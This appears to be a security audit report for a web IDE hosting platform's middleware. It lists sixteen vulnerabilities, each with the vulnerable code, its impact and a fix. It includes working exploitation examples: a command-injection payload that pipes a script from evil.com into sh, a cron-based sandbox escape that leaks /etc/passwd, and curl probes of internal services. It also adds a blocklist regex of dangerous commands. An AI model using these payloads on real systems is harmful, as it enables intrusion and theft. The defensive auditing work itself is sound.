# GoCodeMe IDE — Security Audit Round 3

**Date:** 2025-01-XX  
**Auditor:** Automated Penetration Test (Round 3)  
**Scope:** GoCodeMe middleware server, all service-to-service bridges, sandbox isolation, billing, DirectAdmin integration  
**Prior Work:** Rounds 1 & 2 fixed 45 vulnerabilities (R1-01 through R2-24)

---

## Executive Summary

Round 3 identified **16 new vulnerabilities** across the GoCodeMe middleware platform. The most critical findings are:

1. A **timing side-channel** in the Alfred bridge's secret comparison enables byte-by-byte secret recovery, granting full admin access to all user accounts.
2. A **sandbox escape via cron job creation** allows any authenticated user to execute arbitrary commands outside the bubblewrap sandbox.
3. **Command injection** through `execSync()` string interpolation in the workspace sync module.
4. **Pervasive error message disclosure** leaking internal stack traces, file paths, and DirectAdmin API details to clients.

Combined, these could allow a motivated attacker with a valid customer account to: escape the sandbox, compromise other tenants, extract API keys, and gain administrative control of the hosting infrastructure.

---

## Findings (sorted by severity)

---

### R3-01 — CRITICAL: Alfred Bridge Uses Timing-Unsafe Secret Comparison

**File:** `middleware/src/routes/alfred.js` lines 47–55  
**Also affects:** `middleware/src/routes/referral.js` line 175, `middleware/src/monitoring/healthMonitor.js` line 195

**Vulnerable Code:**
```javascript
// alfred.js:47-55 — INLINE function, does NOT use shared whmcsSecret.js
function requireAlfredSecret(req, res, next) {
  const secret = req.headers['x-whmcs-secret'];
  if (!secret || secret !== process.env.WHMCS_WEBHOOK_SECRET) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}
router.use(requireAlfredSecret);
```

**Impact:** The `!==` operator performs short-circuit string comparison — it returns faster when the first differing byte is found. An attacker can measure response times to recover the WHMCS webhook secret one character at a time. The shared `requireWhmcsSecret` module in `auth/whmcsSecret.js` already uses `crypto.timingSafeEqual`, but alfred.js, referral.js, and healthMonitor.js define their own inline checks and don't use it.

**Exploitation:** An attacker sends thousands of requests with incrementally correct secret prefixes, measuring response latency. With ~256 requests per byte position and 64-byte hex secret, the full secret can be recovered in ~16,000 requests. Once recovered, the attacker has full admin access to ALL 50+ Alfred bridge endpoints including `create-account`, `delete-account`, `suspend-user`, `reset-password`, and `mcp-tool`.

**Fix:**
```diff
 // alfred.js — Replace inline function with shared module
+'use strict';
+const { requireWhmcsSecret } = require('../auth/whmcsSecret');
 
-function requireAlfredSecret(req, res, next) {
-  const secret = req.headers['x-whmcs-secret'];
-  if (!secret || secret !== process.env.WHMCS_WEBHOOK_SECRET) {
-    return res.status(401).json({ ok: false, error: 'Unauthorized' });
-  }
-  next();
-}
-router.use(requireAlfredSecret);
+router.use(requireWhmcsSecret);
```
Apply the same fix in `referral.js` and `healthMonitor.js` — replace all inline `!==` checks with `requireWhmcsSecret` from the shared module.

---

### R3-02 — CRITICAL: Sandbox Escape via Cron Job Creation

**File:** `middleware/src/routes/hosting.js` lines 372–383, `middleware/src/routes/alfred.js` lines 1218–1229, `middleware/src/directadmin/cronManager.js` lines 63–77

**Vulnerable Code:**
```javascript
// hosting.js:371-384
router.post('/cron', async (req, res) => {
  const { minute, hour, dayOfMonth, month, dayOfWeek, command } = req.body;
  if (!command) {
    return res.status(400).json({ ok: false, error: 'command is required' });
  }
  try {
    await cronMgr.createCronJob(
      req.daUsername,
      minute || '*', hour || '*', dayOfMonth || '*', month || '*', dayOfWeek || '*',
      command  // ← No validation whatsoever
    );
    res.json({ ok: true });
```

```javascript
// cronManager.js:63-77 — passes command directly to DA CMD_API
async function createCronJob(daUsername, minute, hour, dayOfMonth, month, dayOfWeek, command) {
  const client = createDAClient(daUsername);
  const params = new URLSearchParams({
    action:   'create',
    minute, hour, dayofmonth: dayOfMonth, month, dayofweek: dayOfWeek,
    command,   // ← Sent raw to DirectAdmin
  });
  const resp = await client.post('/CMD_API_CRON_JOBS', params.toString());
```

**Impact:** The IDE terminal runs inside a bubblewrap sandbox (`--unshare-all --share-net`) that restricts filesystem access and process isolation. However, cron jobs created via the DirectAdmin API execute as the actual system user **outside the sandbox**. Any authenticated user can bypass all sandbox restrictions by creating a cron job with an arbitrary command.

**Exploitation:**
```bash
# Authenticated user creates a cron job via the hosting API:
curl -X POST https://gositeme.com/middleware/api/hosting/cron \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "minute": "*/1", "hour": "*", "command": "cat /etc/passwd > /home/user/domains/user.gocodeme.com/public_html/leak.txt"
  }'
# Command runs as the DA user, OUTSIDE the sandbox, with full filesystem access
```

**Fix:**
```diff
 // cronManager.js — Add command validation
+const ALLOWED_CRON_COMMANDS = /^(\/usr\/local\/bin\/php|\/usr\/bin\/php|\/usr\/bin\/node|\/usr\/bin\/python3?|\/usr\/bin\/curl|\/usr\/bin\/wget)/;
+const BLOCKED_PATTERNS = /[;&|`$(){}]|>(>)?|<|\\n|\\0|\bsudo\b|\bchmod\b|\bchown\b|\brm\s+-rf\b|\bcat\s+\/etc/i;
+
 async function createCronJob(daUsername, minute, hour, dayOfMonth, month, dayOfWeek, command) {
+  // Validate command against allowlist and blocklist
+  if (!ALLOWED_CRON_COMMANDS.test(command.trim())) {
+    throw new Error('Cron command must start with an allowed interpreter path (php, node, python, curl, wget)');
+  }
+  if (BLOCKED_PATTERNS.test(command)) {
+    throw new Error('Cron command contains blocked characters or patterns');
+  }
+
   const client = createDAClient(daUsername);
```

---

### R3-03 — CRITICAL: Command Injection in syncWorkspace via execSync

**File:** `middleware/src/directadmin/syncWorkspace.js` lines 460–461

**Vulnerable Code:**
```javascript
// syncWorkspace.js:459-461
execSync('git init', { cwd: localDir, stdio: 'pipe' });
execSync(`git config user.email "${daUsername}@gocodeme.com"`, { cwd: localDir, stdio: 'pipe' });
execSync('git config user.name "GoCodeMe User"', { cwd: localDir, stdio: 'pipe' });
```

**Calling context — alfred.js `/sync-workspace` takes daUsername directly from POST body:**
```javascript
// alfred.js — sync-workspace endpoint
router.post('/sync-workspace', async (req, res) => {
  const { daUsername, localDir, domain } = req.body;  // ← daUsername from POST body, not resolved
  if (!daUsername || !localDir) { ... }
  const result = await syncWorkspace(daUsername, localDir, domain);
```

**Impact:** The `daUsername` parameter is interpolated directly into an `execSync()` shell command using template literals. Unlike other Alfred endpoints that resolve `client_id → daUsername` via Redis (which returns a validated DA username), the `/sync-workspace` endpoint takes `daUsername` directly from the POST body. If the WHMCS webhook secret is compromised (see R3-01), an attacker can inject arbitrary shell commands.

**Exploitation:**
```bash
curl -X POST https://gositeme.com/middleware/api/alfred/sync-workspace \
  -H "X-WHMCS-Secret: <stolen_secret>" \
  -H "Content-Type: application/json" \
  -d '{
    "daUsername": "x\";curl http://evil.com/shell.sh|sh;echo \"",
    "localDir": "/tmp/test"
  }'
# Results in: execSync('git config user.email "x";curl http://evil.com/shell.sh|sh;echo ""@gocodeme.com"')
```

**Fix:**
```diff
 // syncWorkspace.js — Use execFile (not execSync) to avoid shell interpolation
+const { execFileSync } = require('child_process');
+
+// Validate daUsername before use
+if (!/^[a-zA-Z0-9_]{1,16}$/.test(daUsername)) {
+  throw new Error('Invalid DA username format');
+}
+
 const gitDir = path.join(localDir, '.git');
 if (!fs.existsSync(gitDir)) {
   try {
-    execSync('git init', { cwd: localDir, stdio: 'pipe' });
-    execSync(`git config user.email "${daUsername}@gocodeme.com"`, { cwd: localDir, stdio: 'pipe' });
-    execSync('git config user.name "GoCodeMe User"', { cwd: localDir, stdio: 'pipe' });
+    execFileSync('git', ['init'], { cwd: localDir, stdio: 'pipe' });
+    execFileSync('git', ['config', 'user.email', `${daUsername}@gocodeme.com`], { cwd: localDir, stdio: 'pipe' });
+    execFileSync('git', ['config', 'user.name', 'GoCodeMe User'], { cwd: localDir, stdio: 'pipe' });
     // ...
-    execSync('git add -A && git commit -m "Initial snapshot" --allow-empty', { cwd: localDir, stdio: 'pipe' });
+    execFileSync('git', ['add', '-A'], { cwd: localDir, stdio: 'pipe' });
+    execFileSync('git', ['commit', '-m', 'Initial snapshot', '--allow-empty'], { cwd: localDir, stdio: 'pipe' });
```

---

### R3-04 — CRITICAL: Shell Injection in Deploy Command (extras.js)

**File:** `middleware/src/routes/extras.js` lines 326–328

**Vulnerable Code:**
```javascript
// extras.js:326-328
const cmd = `rsync -av --delete --exclude='node_modules' --exclude='.git' --exclude='.env' "${workDir}/" "${pubDir}/" 2>&1`;
exec(cmd, { timeout: 30000 }, async (err, stdout, stderr) => {
```

Where:
```javascript
const workDir = `/home/${daUsername}/ide-workspace`;
const pubDir  = `/home/${daUsername}/domains/${daUsername}.gocodeme.com/public_html`;
```

**Impact:** `daUsername` from the JWT payload is interpolated into a shell command via `exec()`. While `daUsername` originates from a signed JWT, JWT contents are set during SSO token issuance from WHMCS data. If a WHMCS admin (or attacker who compromises WHMCS) provisions a user with a crafted username containing shell metacharacters, the deploy endpoint becomes a command injection vector. Defense-in-depth requires validation at every layer.

**Fix:**
```diff
+// Validate daUsername format before shell use
+if (!/^[a-zA-Z0-9_]{1,16}$/.test(daUsername)) {
+  return res.status(400).json({ ok: false, error: 'Invalid username format' });
+}
+
-const cmd = `rsync -av --delete --exclude='node_modules' --exclude='.git' --exclude='.env' "${workDir}/" "${pubDir}/" 2>&1`;
-exec(cmd, { timeout: 30000 }, async (err, stdout, stderr) => {
+const { execFile } = require('child_process');
+execFile('rsync', [
+  '-av', '--delete',
+  '--exclude=node_modules', '--exclude=.git', '--exclude=.env',
+  workDir + '/', pubDir + '/'
+], { timeout: 30000 }, async (err, stdout, stderr) => {
```

---

### R3-05 — HIGH: Global Error Handler Leaks Internal Error Messages

**File:** `middleware/src/server.js` line 313, plus all `hosting.js` and `alfred.js` error handlers

**Vulnerable Code:**
```javascript
// server.js:311-314 — Global error handler
app.use((err, _req, res, _next) => {
  logger.error(err.stack || err.message);
  const status = err.status || 500;
  res.status(status).json({ ok: false, error: err.message || 'Internal server error' });
});

// hosting.js — EVERY endpoint returns raw err.message (30+ instances)
  } catch (err) {
    logger.error(`hosting-api: create database failed: ${err.message}`);
    res.status(500).json({ ok: false, error: err.message });
  }

// alfred.js — Same pattern across 50+ endpoints
  } catch (err) {
    logger.error(`alfred/create-account: ${err.message}`);
    res.status(500).json({ ok: false, error: err.message });
  }
```

**Impact:** Internal error messages can leak: file system paths (`/home/<username>/...`), database connection strings, DirectAdmin API error details (`DNS record add failed: error=1&text=...`), Redis connection errors, and Node.js stack traces. Attackers use this information to map internal infrastructure.

**Fix:**
```diff
 // server.js — Global error handler
 app.use((err, _req, res, _next) => {
   logger.error(err.stack || err.message);
   const status = err.status || 500;
-  res.status(status).json({ ok: false, error: err.message || 'Internal server error' });
+  // Never leak internal error details to clients
+  const safeMessage = status < 500
+    ? (err.message || 'Request error')
+    : 'Internal server error';
+  res.status(status).json({ ok: false, error: safeMessage });
 });

 // Create a shared helper for route-level error handling:
+// helpers/safeError.js
+function safeErrorResponse(res, err, context) {
+  logger.error(`${context}: ${err.message}`);
+  const message = err.isOperational
+    ? err.message
+    : 'An internal error occurred. Please try again.';
+  res.status(err.status || 500).json({ ok: false, error: message });
+}
```

---

### R3-06 — HIGH: redis.keys() Used in Hot Request Paths (DoS Vector)

**File:** `middleware/src/routes/ideProxy.js` lines 2358, 2418, 2443; `middleware/src/server.js` line 372; `middleware/src/routes/launch.js` line 70

**Vulnerable Code:**
```javascript
// ideProxy.js:2356-2366 — Called on EVERY IDE proxy request via validatePort()
async function validatePort(port) {
  if (port < PORT_MIN || port > PORT_MAX) return false;
  const redis = getRedis();
  const keys = await redis.keys('launch:sessions:*');  // ← O(N) full scan
  for (const key of keys) {
    try {
      const sessions = JSON.parse(await redis.get(key));
      if (sessions.some(s => s.port === port)) {
        return key.replace('launch:sessions:', '');
      }
    } catch { }
  }
  return false;
}

// ideProxy.js:2416-2444 — Activity tracking, also on every request
const keys = await rds.keys('launch:sessions:*');  // ← AGAIN on every request
// ideProxy.js:2443 — Voice auth injection, AGAIN on every request
const keys = await rds.keys('launch:sessions:*');  // ← THIRD time per request
```

**Impact:** `KEYS` is an O(N) command that blocks the entire Redis instance while scanning all keys. Each IDE proxy request calls `redis.keys('launch:sessions:*')` up to **3 times**. With many users, this creates a quadratic performance problem and can cause Redis to become unresponsive, blocking ALL middleware operations (auth, token tracking, billing).

**Fix:**
```diff
+// Use a Redis SET to track active ports → owners mapping
+// On session create: redis.hset('launch:port_owners', port, daUsername)
+// On session delete: redis.hdel('launch:port_owners', port)
+
 async function validatePort(port) {
   if (port < PORT_MIN || port > PORT_MAX) return false;
   const redis = getRedis();
-  const keys = await redis.keys('launch:sessions:*');
-  for (const key of keys) {
-    try {
-      const sessions = JSON.parse(await redis.get(key));
-      if (sessions.some(s => s.port === port)) {
-        return key.replace('launch:sessions:', '');
-      }
-    } catch { }
-  }
-  return false;
+  // O(1) lookup instead of O(N) KEYS scan
+  const owner = await redis.hget('launch:port_owners', String(port));
+  return owner || false;
 }
```

---

### R3-07 — HIGH: DirectAdmin API TLS Certificate Validation Disabled

**File:** `middleware/src/directadmin/client.js` line 22

**Vulnerable Code:**
```javascript
// client.js:22
const httpsAgent = new https.Agent({ rejectUnauthorized: false });
```

**Impact:** All communication between the middleware and DirectAdmin API (which carries admin credentials, user passwords, database credentials, and file contents) is vulnerable to man-in-the-middle attacks. An attacker with network access can intercept the admin impersonation credentials (`admin|username` + admin password) and gain full DirectAdmin admin access.

**Fix:**
```diff
-const httpsAgent = new https.Agent({ rejectUnauthorized: false });
+const httpsAgent = new https.Agent({
+  // Pin the DA server's CA cert or use the system CA bundle
+  rejectUnauthorized: config.server.env === 'production',
+  // If using self-signed cert, pin it:
+  // ca: fs.readFileSync('/path/to/da-ca.pem'),
+});
```

---

### R3-08 — HIGH: No JWT Token Revocation Mechanism

**File:** `middleware/src/auth/middleware.js` (entire module)

**Vulnerable Code:**
```javascript
// middleware.js — No blacklist check anywhere in the auth flow
async function requireSession(req, res, next) {
  // ...
  try {
    req.user = verifySessionToken(token);  // Only checks signature + expiry
    next();
  } catch (err) {
    // Auto-refresh expired tokens within 4-hour grace period
    // Checks access status BUT only for expired tokens being refreshed
    // Active (non-expired) tokens for suspended accounts still pass!
```

**Impact:** There is no mechanism to revoke active JWT tokens. A token issued before an account is suspended remains valid for up to 24 hours (+ 4-hour refresh grace). The suspension check only runs during the auto-refresh path for *expired* tokens — active tokens for suspended users pass `requireSession` without any check. Additionally, there is no logout endpoint that invalidates tokens.

**Fix:**
```diff
 async function requireSession(req, res, next) {
   // ...
   try {
     req.user = verifySessionToken(token);
+    // Check account status on EVERY request (cached, 60s TTL)
+    const { getRedis } = require('../redis');
+    const redis = getRedis();
+    const accessStatus = await redis.get(`access:${req.user.whmcsClientId}`);
+    if (accessStatus === 'suspended' || accessStatus === 'terminated') {
+      return res.status(401).json({ error: 'Account suspended' });
+    }
     next();
   } catch (err) {
```

---

### R3-09 — HIGH: Alfred Account Management Has No Authorization Boundaries

**File:** `middleware/src/routes/alfred.js` lines 1069–1168

**Vulnerable Code:**
```javascript
// alfred.js — These endpoints take ANY username, not just the client's own
router.post('/list-users', async (req, res) => {
  const users = await accountManager.listUsers();  // Lists ALL DA users
  res.json({ ok: true, users });
});

router.post('/user-info', async (req, res) => {
  const { username } = req.body;  // ← Any username, no ownership check
  const info = await accountManager.getUserInfo(username);

router.post('/delete-account', async (req, res) => {
  const { username } = req.body;  // ← Can delete ANY user
  await accountManager.deleteUser(username);

router.post('/suspend-user', async (req, res) => {
  const { username } = req.body;  // ← Can suspend ANY user
  await accountManager.suspendUser(username);

router.post('/reset-password', async (req, res) => {
  const { username, newPassword } = req.body;  // ← Can reset ANY user's password
  await accountManager.resetPassword(username, newPassword);
```

**Impact:** While these endpoints are behind the WHMCS webhook secret, they expose full DirectAdmin admin-level operations (list all users, delete any account, reset any password, change any package) with zero per-user authorization. If the secret is leaked (see R3-01), an attacker has complete administrative control. Even legitimately, Alfred AI agent calls these with only a `client_id` — there's no verification that the client_id matches the target username.

**Fix:**
```diff
+// Add authorization: only allow operations on accounts resolved from the caller's client_id
 router.post('/user-info', async (req, res) => {
-  const { username } = req.body;
-  if (!username) return res.status(400).json({ ok: false, error: 'username required' });
-  const info = await accountManager.getUserInfo(username);
+  const { client_id } = req.body;
+  if (!client_id) return res.status(400).json({ ok: false, error: 'client_id required' });
+  const daUsername = await resolveUsername(client_id);
+  if (!daUsername) return res.json({ ok: false, error: 'No account found.' });
+  const info = await accountManager.getUserInfo(daUsername);  // Only own account
```

For truly admin-only endpoints (`list-users`, `delete-account`, `suspend-user`), add a separate admin authorization layer beyond just the WHMCS secret.

---

### R3-10 — MEDIUM: Redis Connections Have No Authentication or TLS

**File:** `middleware/src/redis.js` lines 11–15, `middleware/src/config.js` line 62

**Vulnerable Code:**
```javascript
// redis.js:10-15
function getRedis() {
  if (!redisClient) {
    redisClient = new Redis(config.redis.url, {
      maxRetriesPerRequest: 3,
      enableReadyCheck: true,
      lazyConnect: false,
      // No password, no TLS configuration
    });

// config.js:62
redis: {
  url: process.env.REDIS_URL || 'redis://localhost:6379',  // redis://, not rediss://
},
```

**Impact:** Redis stores session data, JWT mappings, token budgets, API keys, and billing state. Without authentication, any process on the host (or any attacker who reaches port 6379) can read/modify all data — steal sessions, reset token limits, modify access status, or inject fake user mappings.

**Fix:**
```diff
 // config.js
 redis: {
-  url: process.env.REDIS_URL || 'redis://localhost:6379',
+  url: process.env.REDIS_URL || 'redis://localhost:6379',
+  password: process.env.REDIS_PASSWORD || undefined,
 },

 // redis.js
 redisClient = new Redis(config.redis.url, {
+  password: config.redis.password,
+  tls: config.server.env === 'production' ? {} : undefined,
   maxRetriesPerRequest: 3,
```

Also configure Redis itself with `requirepass` in `redis.conf`.

---

### R3-11 — MEDIUM: Sandbox Mounts /proc and Shares Network Namespace

**File:** `scripts/gocodeme-shell.sh` (bwrap configuration)

**Vulnerable Code:**
```bash
exec bwrap \
  --unshare-all \
  --share-net \           # ← Full network access
  --proc /proc \          # ← Full /proc visibility
  --dev /dev \
  # ...
```

**Impact:** 
- `--share-net`: The sandbox shares the host's network namespace. Sandboxed IDE users can probe internal services (Redis on 6379, middleware on 3001, MCP on 3005, DirectAdmin on 2222) directly from their terminal.
- `--proc /proc`: Exposes `/proc/*/environ` (may leak env vars of other processes), `/proc/*/cmdline`, and system information.

**Exploitation:**
```bash
# From inside the sandboxed IDE terminal:
curl http://127.0.0.1:6379/  # Direct Redis access (unauthenticated, see R3-10)
curl http://127.0.0.1:3001/health  # Middleware health
curl http://127.0.0.1:3005/mcp  # MCP server
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'  # Attempt to read init env vars
```

**Fix:**
```diff
 exec bwrap \
   --unshare-all \
-  --share-net \
+  # Network isolation: use --unshare-net (included in --unshare-all)
+  # If network is needed for npm install etc., use a network namespace
+  # with iptables rules blocking access to 127.0.0.1 internal services
-  --proc /proc \
+  --proc /proc \
+  --bind /dev/null /proc/1/environ \
   --dev /dev \
```

For network, either remove `--share-net` entirely (if IDE doesn't need outbound internet) or use iptables/nftables rules in the namespace to block access to localhost ports 2222, 3001, 3005, 6379.

---

### R3-12 — MEDIUM: npm Package Install via Shell exec() with String Interpolation

**File:** `middleware/src/routes/extras.js` line 458

**Vulnerable Code:**
```javascript
// extras.js:458
exec(`cd "${workDir}" && npm install --save "${pkgName}" 2>&1 | tail -5`, { timeout: 60000 }, (err, stdout) => {
```

Where `pkgName` is validated with: `if (!/^[@a-z0-9][\w./-]*$/i.test(pkgName))` — but this regex allows `.` and `/` which can be exploited in path traversal contexts. More critically, `workDir` includes `daUsername` which is not re-validated here.

**Impact:** While the package name regex provides some protection, it allows patterns like `@scope/../../etc/passwd` that npm would reject but that could cause unexpected behavior in the shell. Using `exec()` with string interpolation is categorically unsafe — a defense-in-depth violation.

**Fix:**
```diff
-exec(`cd "${workDir}" && npm install --save "${pkgName}" 2>&1 | tail -5`, { timeout: 60000 }, (err, stdout) => {
+const { execFile } = require('child_process');
+execFile('npm', ['install', '--save', pkgName], { cwd: workDir, timeout: 60000 }, (err, stdout, stderr) => {
+  const output = (stdout + stderr).split('\n').slice(-5).join('\n');
```

---

### R3-13 — MEDIUM: DNS Record Injection — No Type/Value Validation

**File:** `middleware/src/directadmin/dnsManager.js` lines 65–85, `middleware/src/routes/hosting.js` lines 303–314

**Vulnerable Code:**
```javascript
// dnsManager.js:65-85
async function addDnsRecord(daUsername, domain, type, name, value, ttl = 14400) {
  const client = createDAClient(daUsername);
  const params = new URLSearchParams({
    action:  'add',
    domain,
    type:    type.toUpperCase(),  // ← No validation of type
    name,                         // ← No validation of name
    value,                        // ← No validation of value
    ttl:     String(ttl),
  });
  const resp = await client.post('/CMD_API_DNS_CONTROL', params.toString());
```

**Impact:** Users can create arbitrary DNS record types and inject malicious values. While DirectAdmin has some validation, the middleware should enforce its own allowlist. A user could create records for the parent domain via relative name tricks, or inject TXT records with malicious payloads for SPF/DKIM spoofing.

**Fix:**
```diff
+const ALLOWED_DNS_TYPES = new Set(['A', 'AAAA', 'CNAME', 'MX', 'TXT', 'SRV', 'NS', 'CAA']);
+const DNS_NAME_REGEX = /^[a-zA-Z0-9._@*-]{1,253}$/;
+
 async function addDnsRecord(daUsername, domain, type, name, value, ttl = 14400) {
+  const upperType = type.toUpperCase();
+  if (!ALLOWED_DNS_TYPES.has(upperType)) {
+    throw new Error(`DNS record type '${type}' is not allowed. Allowed: ${[...ALLOWED_DNS_TYPES].join(', ')}`);
+  }
+  if (!DNS_NAME_REGEX.test(name)) {
+    throw new Error('Invalid DNS record name');
+  }
+  if (value.length > 4096) {
+    throw new Error('DNS record value too long');
+  }
+
   const client = createDAClient(daUsername);
```

---

### R3-14 — MEDIUM: MCP Tool Bridge Allows Unrestricted Tool Invocation

**File:** `middleware/src/routes/alfred.js` lines 1691–1750 (the `mcp-tool` endpoint)

**Vulnerable Code:**
```javascript
// alfred.js — MCP tool bridge
router.post('/mcp-tool', async (req, res) => {
  const { tool, arguments: toolArgs = {}, client_id, source = 'unknown' } = req.body;
  if (!tool) return res.status(400).json({ ok: false, error: 'Missing tool name' });

  // No validation of which tools can be called
  // No per-tool authorization
  // Forward ANY tool invocation to MCP server
  const jsonRpcPayload = JSON.stringify({
    jsonrpc: '2.0',
    id: Date.now(),
    method: 'tools/call',
    params: { name: tool, arguments: toolArgs },
  });
```

**Impact:** Any holder of the WHMCS webhook secret can invoke any MCP tool with arbitrary arguments. The MCP server may expose sensitive tools (file system operations, shell execution, database access) that should have per-tool authorization. There is no allowlist of tools that the Alfred bridge is permitted to call.

**Fix:**
```diff
+const ALLOWED_MCP_TOOLS = new Set([
+  'list_files', 'read_file', 'write_file', 'search_files',
+  'list_databases', 'list_domains', 'get_usage',
+  // Add other tools as needed
+]);
+
 router.post('/mcp-tool', async (req, res) => {
   const { tool, arguments: toolArgs = {}, client_id, source = 'unknown' } = req.body;
   if (!tool) return res.status(400).json({ ok: false, error: 'Missing tool name' });
+  if (!ALLOWED_MCP_TOOLS.has(tool)) {
+    return res.status(403).json({ ok: false, error: `Tool '${tool}' is not allowed via bridge` });
+  }
```

---

### R3-15 — MEDIUM: Health Endpoint Exposes System Information

**File:** `middleware/src/monitoring/healthMonitor.js` lines 197–230

**Vulnerable Code:**
```javascript
// healthMonitor.js — /api/admin/health endpoint
r.get('/api/admin/health', async (req, res) => {
  // Protected by WHMCS secret (but with timing-unsafe comparison, see R3-01)
  // Returns:
  res.json({
    ok: true,
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    hostname: require('os').hostname(),     // ← System hostname
    loadAvg: require('os').loadavg(),       // ← Load averages
    nodeVersion: process.version,           // ← Node version
    pid: process.pid,                       // ← Process ID
    redis: { connected: true, keys: keyCount, memory: ... },
    // ... full system fingerprint
  });
```

**Impact:** Combined with R3-01 (timing-unsafe comparison), this endpoint leaks hostname, PID, Node.js version, memory layout, Redis key count, and load averages. This information aids targeted exploitation — Node.js version reveals available CVEs, hostname reveals infrastructure topology.

**Fix:**
```diff
+const { requireWhmcsSecret } = require('../auth/whmcsSecret');
+
 r.get('/api/admin/health', async (req, res) => {
-  const secret = req.headers['x-whmcs-secret'];
-  if (!secret || secret !== process.env.WHMCS_WEBHOOK_SECRET) {
-    return res.status(401).json({ ok: false, error: 'Unauthorized' });
-  }
+  // Use timing-safe comparison from shared module  
+  requireWhmcsSecret(req, res, async () => {
     // ... existing health check logic
+  });
 });
+
+// Also consider: don't expose hostname, PID, nodeVersion externally
```

---

### R3-16 — LOW: Idle Session Reaper Exposes Race Condition on Session Cleanup

**File:** `middleware/src/server.js` lines 370–410

**Vulnerable Code:**
```javascript
// server.js:370-410
setInterval(async () => {
  const redis = getRedis();
  const keys = await redis.keys('launch:sessions:*');
  for (const key of keys) {
    const daUsername = key.replace('launch:sessions:', '');
    const sessRaw = await redis.get(key);
    let sessions = [];
    try { sessions = JSON.parse(sessRaw) || []; } catch {}
    
    // Dead PID detection
    const allDead = sessions.every(s => {
      if (!s.pid) return true;
      try { process.kill(s.pid, 0); return false; } catch { return true; }
    });
    if (allDead) {
      await redis.del(key);          // ← Not atomic with the read
      await redis.del(`activity:${daUsername}`);
```

**Impact:** The reaper reads session data, checks PIDs, then deletes the key. Between the read and delete, a new session could be launched and stored in the same key. The reaper would delete the new session data. While this is a low-severity race condition, it causes user-visible bugs (IDE session vanishes shortly after launch). Using `redis.keys()` here also contributes to the R3-06 DoS concern.

**Fix:**
```diff
+// Use WATCH/MULTI for atomic check-and-delete
 if (allDead) {
-  await redis.del(key);
-  await redis.del(`activity:${daUsername}`);
+  // Only delete if the value hasn't changed since we read it
+  const pipeline = redis.multi();
+  pipeline.watch(key);
+  const currentVal = await redis.get(key);
+  if (currentVal === sessRaw) {
+    pipeline.del(key);
+    pipeline.del(`activity:${daUsername}`);
+    await pipeline.exec();
+  } else {
+    pipeline.discard();
+  }
```

---

## Summary Table

| ID | Severity | Title | File(s) |
|---|---|---|---|
| R3-01 | **CRITICAL** | Timing-unsafe secret comparison in Alfred bridge | alfred.js, referral.js, healthMonitor.js |
| R3-02 | **CRITICAL** | Sandbox escape via cron job creation | hosting.js, alfred.js, cronManager.js |
| R3-03 | **CRITICAL** | Command injection in syncWorkspace execSync | syncWorkspace.js, alfred.js |
| R3-04 | **CRITICAL** | Shell injection in deploy exec() command | extras.js |
| R3-05 | **HIGH** | Global error handler leaks internal error messages | server.js, hosting.js, alfred.js |
| R3-06 | **HIGH** | redis.keys() in hot request paths (DoS) | ideProxy.js, server.js, launch.js |
| R3-07 | **HIGH** | DA API TLS certificate validation disabled | client.js |
| R3-08 | **HIGH** | No JWT token revocation mechanism | middleware.js |
| R3-09 | **HIGH** | Alfred admin endpoints lack per-user authorization | alfred.js |
| R3-10 | **MEDIUM** | Redis without authentication or TLS | redis.js, config.js |
| R3-11 | **MEDIUM** | Sandbox mounts /proc and shares network | gocodeme-shell.sh |
| R3-12 | **MEDIUM** | npm install via shell exec() interpolation | extras.js |
| R3-13 | **MEDIUM** | DNS record injection — no type/value validation | dnsManager.js, hosting.js |
| R3-14 | **MEDIUM** | MCP tool bridge allows unrestricted invocation | alfred.js |
| R3-15 | **MEDIUM** | Health endpoint exposes system information | healthMonitor.js |
| R3-16 | **LOW** | Idle session reaper race condition | server.js |

---

## Recommended Priority

1. **Immediate (deploy today):** R3-01 (replace `!==` with shared timing-safe module — 3-line change in 3 files)
2. **Urgent (this week):** R3-02, R3-03, R3-04 (command injection / sandbox escape)
3. **High priority (next sprint):** R3-05, R3-06, R3-07, R3-08, R3-09
4. **Medium priority (within 30 days):** R3-10 through R3-15
5. **Low priority (backlog):** R3-16
